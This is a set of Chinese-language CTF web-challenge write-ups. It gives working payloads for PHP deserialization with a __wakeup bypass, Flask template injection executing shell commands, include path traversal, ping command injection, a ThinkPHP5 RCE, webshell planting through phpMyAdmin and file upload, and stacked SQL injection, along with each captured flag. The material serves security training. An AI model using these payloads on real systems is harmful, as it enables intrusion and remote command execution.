## DifficultyTwo

### Web_php_unserialize

1. 查看页面源代码

   ```php
   <?php 
   class Demo { 
       private $file = 'index.php';
       public function __construct($file) { 
           $this->file = $file; 
       }
       function __destruct() { 
           echo @highlight_file($this->file, true); 
       }
       function __wakeup() { 
           if ($this->file != 'index.php') { 
               //the secret is in the fl4g.php
               $this->file = 'index.php'; 
           } 
       } 
   }
   if (isset($_GET['var'])) { 
       $var = base64_decode($_GET['var']); 
       if (preg_match('/[oc]:\d+:/i', $var)) { 
           die('stop hacking!'); 
       } else {
           @unserialize($var); 
       } 
   } else { 
       highlight_file("index.php"); 
   } 
   ?>
   ```
2. 将序列化的Demo对象base64编码后传给var，base64解码先通过正则表达式匹配，然后反序列化，调用wakeup（wakeup会将读取的fl4g.php替换为index.php），对象销毁时显示文件内容，文件名为fl4g.php
3. 正则表达式过滤：/[oc]:\d+:/i

   * /***/   ：php中的正则表达式需要用斜杠包裹
   * [oc]    :   此字符为o或c
   * :         :   单纯冒号，无特殊意义
   * \d     :匹配一个数字
   * +：上一个字符可以出现多次
   * /i  ：大小写字母都在匹配范围内
4. 第一次：payload

   O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
5. 通过在4前面多一个+绕过正则表达式，通过将1改为2绕过wakeup

   payload：O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}

注意：这道题序列化后的字符串有特殊字符显示不出来，如果将序列化的字符串复制后在文本编辑器更改，将会失败，应用函数str_replace函数将第一次的payload修改

ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}

### Web_python_template_injection

1. python模板注入，查阅pythonflask模板注入漏洞，指的是没有对用户输入做出过滤，导致用户输入被python解释器解析，用户可以凭借python的类方法，随意调用其中的对象及其功能
2. 输入：[61.147.171.105:61607/%7B%7B2+2%7D%7D](http://61.147.171.105:61607/%7B%7B2+2%7D%7D)
   出现数字4，2+2被解析
3. 基于python强大的内置类方法，有多种payload可行
   可调用os模块可执行系统命令
   payload：

   ```python
   ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
   ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
   ```

   `__class__`:返回字符串所属的对象

   `__mro__[2]`:返回基类object

   `__subclasses__()[71]`:返回object下的子类列表，选取71个对象，<class 'site._Printer'>，

   `__init__.__globals__['os']`:调用__init__初始化os模块

   `popen('cmd').read()`:调用执行任意系统命令，popen返回的是命令执行的结果，而system返回的是执行后的状态码

ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}

### warmup

1. 页面只有一个滑稽哥，F12查看源代码，发现source.php
2. 访问得到源代码：

   ```php
   <?php
       highlight_file(__FILE__);
       class emmm
       {
           public static function checkFile(&$page)
           {
               $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
               if (! isset($page) || !is_string($page)) {
                   echo "you can't see it";
                   return false;
               }

               if (in_array($page, $whitelist)) {
                   return true;
               }

               $_page = mb_substr(
                   $page,
                   0,
                   mb_strpos($page . '?', '?')
               );
               if (in_array($_page, $whitelist)) {
                   return true;
               }

               $_page = urldecode($page);
               $_page = mb_substr(
                   $_page,
                   0,
                   mb_strpos($_page . '?', '?')
               );
               if (in_array($_page, $whitelist)) {
                   return true;
               }
               echo "you can't see it";
               return false;
           }
       }

       if (! empty($_REQUEST['file'])
           && is_string($_REQUEST['file'])
           && emmm::checkFile($_REQUEST['file'])
       ) {
           include $_REQUEST['file'];
           exit;
       } else {
           echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
       }  
   ?>
   ```
3. get传参file=hint.php,得到包含flag的文件名：ffffllllaaaagggg
4. 观察其中的过滤，关键在于其中的mb_substr函数，这个函数的总体作用是返回问号之前的代码，如果我们输入xxx？xxx，不管问号后的内容是什么，只要问号之前的内容在白名单，就可以通过检测，构造payload：

   file=source.php?../../../../../ffffllllaaaagggg

   关于include，他为什么能包含source.php?../../../../../ffffllllaaaagggg这个奇怪的路径，php官方文档给出解释

   如果定义了路径——不管是绝对路径（在 Windows   下以盘符或者 *\* 开头，在 Unix/Linux   下以 */* 开头）还是当前目录的相对路径（以   *.* 或者 *..* 开头）——[include_path](mk:@MSITStore:E:\php5.6中文手册\php5.6中文手册\php_manual_zh_notreview.chm::/res/ini.core.html#ini.include-path "include_path") 都会被完全忽略。例如一个文件以   *../* 开头，则解析器会在当前目录的父目录下寻找该文件。

   打开pikachu目录遍历测试，随便输，发现以下两种都可以：

   /asdasdasdas/asdaadsjigassd/../../../../../index.php
   /asdaadsjigassd/../../../../index.php

flag{25e7bce6005c4e0c983fb97297ac6e5a}

### command_execution

1. 是个ping命令，构造：
   127.0.0.1 & ls /home
2. 发现flag.txt：
   127.0.0.1 & cat /home/flag.txt

cyberpeace{28a49c66ddd437efd0c45cdd9c0f5a73}

### php_rce

1. 靶场由thinkphp5搭建，直接搜，payload：

   s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /
2. 有flag文件

   s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag

flag{thinkphp5_rce}

### Web_php_include

* 解法一

  1. disearch扫后台，发现phpmyadmin，没有设置密码，直接登入
  2. 利用select "php一句话木马" into ourfile '/tmp/shell.php'
  3. 冰蝎连接
* 解法二

  1. php类协议被过滤，利用别的协议data://text/plain,php代码（写一个shell文件）
  2. 冰蝎连接
* 解法三

  1. 直接利用hello输出系统命令会被html注释掉，利用文件包含index.php后再次传参就会按照php代码正常解析
  2. http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E
     fl4gisisish3r3.php index.php phpinfo.php
  3. http://61.147.171.105:60418/index.php?page=http://127.0.0.1/index.php/?hello=&lt;?show_source(&#34;fl4gisisish3r3.php&#34;);?&gt;

ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}

### upload1

1. 上传shell被弹窗，禁用js上传成功
2. 冰蝎连接

cyberpeace{096ec4998d48f859aacf4526a55b3049}

### xff_referer

1. 根据提示更改数据包再发包

cyberpeace{9f25d8ef08ec7f6fc8ed44ce771fe9af}

### web2

1. 解密

   ```php
   <?php
       $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";
       $_o = base64_decode(strrev(str_rot13($miwen)));
       for($_0=0;$_0<strlen($_o);$_0++){

           $_c=substr($_o,$_0,1);
           $__=ord($_c)-1;
           $_c=chr($__);
           $_=$_.$_c;   
       }
       echo strrev($_);
   ?>
   ```

flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}

### supersqli

1. sql注入，尝试'提交，报错为（'''''），左右的第一对单引号是镇长显示错误内容需要括起来的，剩下的三个单引号为报错信息，中间的就是我的输入，构造payload：' union select 1,2,3--+
2. 被正则表达式过滤了，这时候尝试堆叠注入，show databases；，show tables；最后我们需要查1919810931114514表下的内容，通过：
   desc 1919810931114514 from 1919810931114514 查看内容确实有flag字段
3. 由于select被过滤了，可以尝试mysql下的另一种中查询手段，handler

   ';handler 1919810931114514 open; handler 1919810931114514 read first;--+

flag{c168d583ed0d4d7196967b28cbd0b5e9}
